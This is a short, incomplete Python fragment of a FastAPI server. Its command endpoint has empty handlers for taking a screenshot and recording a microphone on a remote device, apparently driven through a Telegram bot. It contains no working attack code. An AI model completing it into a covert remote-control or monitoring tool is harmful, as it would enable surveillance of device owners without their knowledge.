import asyncio
from fastapi import FastAPI, WebSocket
from fastapi.responses import HTMLResponse
# ... existing code plus command handlers for screenshot and mic_record

@app.post("/send_command")
def send_command(cmd: dict):
    if cmd['command'] == 'screenshot':
        # broadcast to device
        pass
    elif cmd['command'] == 'mic_record':
        pass
# Telegram bot already handles /send